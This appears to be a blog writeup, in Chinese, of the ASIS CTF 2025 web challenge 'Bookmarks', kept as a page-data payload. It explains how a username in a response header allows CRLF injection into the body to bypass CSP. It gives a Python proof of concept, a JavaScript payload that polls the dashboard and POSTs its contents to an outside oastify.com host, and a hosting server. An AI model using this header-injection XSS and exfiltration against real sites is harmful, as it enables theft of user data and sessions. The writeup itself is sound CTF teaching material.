+5:[["$","h2",null,{"className":"x-h1","children":"Web/Bookmarks"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"官方WP：<a href=\"https://albertofdr.github.io/post/asisctf-finals-2025/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://albertofdr.github.io/post/asisctf-finals-2025/</a>"}}],["$","h3",null,{"className":"x-h2","children":"审计"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"XSS题，有<code class=\"x-inline-highlight\">bot.py</code>和<code class=\"x-inline-highlight\">/report</code>页面，接收任意URL，bot的核心逻辑是先访问攻击者提交的页面，再注册登录账号（用户名就是flag）。<code class=\"x-inline-highlight\">/dashboard</code>页面会回显用户名。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$f"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"整个应用中有一个很强的全局CSP策略，但同时也存在一个HTTP响应头注入漏洞："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"@app.after_request\ndef add_csp_header(response):\n    response.headers['Content-Security-Policy'] = \"default-src 'none'; style-src 'self';\"\n    return response\n\n\n@app.route(\"/dashboard\", methods=['GET'])\ndef dashboard():\n    user_id = session.get(\"user_id\")\n    if not user_id:\n        return \"User not logged\", 400\n\n    username = None\n    with sqlite3.connect(DB_NAME) as conn:\n        cur = conn.execute(\"SELECT username FROM users WHERE id = ?\", (user_id,))\n        user = cur.fetchone()\n        username = user[0] if user else None\n\n    rendered = render_template(\"dashboard.html\", username=username)\n    response = make_response(rendered)\n    response.headers['X-User-' + username] = user_id\n\n    # Future logic for saving books of each user\n    # ...\n\n    return response\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 72px, var(--bg-transparent-golden) 72px 96px, transparent 96px, transparent 504px, var(--bg-transparent-golden) 504px 528px, transparent 528px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"通过HTTP响应头注入XSS"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"由于<code class=\"x-inline-highlight\">username</code>可控，通过一次换行<code class=\"x-inline-highlight\">&#92;r&#92;n</code>能够实现操纵HTTP响应头结构，而通过两次换行<code class=\"x-inline-highlight\">&#92;r&#92;n&#92;r&#92;n</code>则能进一步穿越到HTTP响应体，从而实现操纵页面内容。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\nimport http.client as http_client\n\nhttp_client.HTTPConnection.debuglevel = 1\n\nurl = \"http://127.0.0.1:5001\"\nusername = \"\"\"1:1\\r\\n\\r\\n<html>\n<head></head>\n<body><script>\n    alert(0);\n</script></body>\n</html>\n<!--\n\"\"\"\n\nresp = requests.get(f\"{url}/dashboard-debug\", params={\n    \"username\": username\n})\n\nprint(\"=================================\")\nprint(resp.text)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"运行上面的PoC代码，注意<code class=\"x-inline-highlight\">resp.text</code>中已经包含了注入的HTML内容，同时也使得<code class=\"x-inline-highlight\">Content-Security-Policy</code>无效化。最后的<code class=\"x-inline-highlight\">&#60;!--</code>屏蔽了原始网页的内容避免干扰。"}}],["$","$L13",null,{"src":"1.jpg"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"此时我们已经获得了在源站执行任意JS代码的能力。"}}],["$","h3",null,{"className":"x-h2","children":"利用"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这题的bot逻辑是先访问攻击者提交的页面，此时bot侧还没有任何与flag相关的信息。因此大致思路是通过<code class=\"x-inline-highlight\">window.open</code>打开一个新标签页，然后在新标签页中轮询<code class=\"x-inline-highlight\">/dashboard</code>页面，当bot完成注册登录后，<code class=\"x-inline-highlight\">session</code>被更新，但新标签页中的JavaScript代码仍在执行，此时就能够获取到包含flag的页面内容。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"JavaScript"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"setInterval(async function() {\n    const resp = await fetch(\"/dashboard\");\n    const data = await resp.text();\n    await fetch(\"http://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com\", {\n        method: \"POST\",\n        headers: {\"Content-Type\": \"application/x-www-form-urlencoded\"},\n        body: \"data=\".concat(encodeURIComponent(data)),\n    });\n}, 500);\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"具体攻击流程如下："}}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"1."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"构建恶意页面，页面中通过JavaScript注册登录一个用户，用户名包含XSS payload；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"2."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"恶意页面通过<code class=\"x-inline-highlight\">window.open</code>打开<code class=\"x-inline-highlight\">/dashboard</code>页面，此时XSS payload触发执行；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"3."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">setInterval</code>将轮询请求<code class=\"x-inline-highlight\">/dashboard</code>页面，一开始得到的会是XSS payload用户的响应内容，不包含flag；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"4."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"bot触发登录，用户名为flag，此时<code class=\"x-inline-highlight\">session</code>Cookie被更新；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"5."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">setInterval</code>仍在执行，bot登录后，对<code class=\"x-inline-highlight\">/dashboard</code>的请求会返回包含flag的响应内容。"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$15"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$16"}}]}]]}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from flask import *\n\napp = Flask(__name__)\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])\ndef index():\n    print(request.headers)\n    return open(\"exp.html\").read()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5099)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$17"}}]}]]}],["$","$L13",null,{"src":"2.jpg","width":"100%","filterDarkTheme":true}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-title","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ASIS{CSP_1s_n0t_4_sh13ld}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ASIS{CSP_1s_n0t_4_sh13ld}"}}]}]]}]]
+d:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"ASIS CTF 2025 Writeup - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/25d/wp-asisctf-2025/"}]]
+1:null
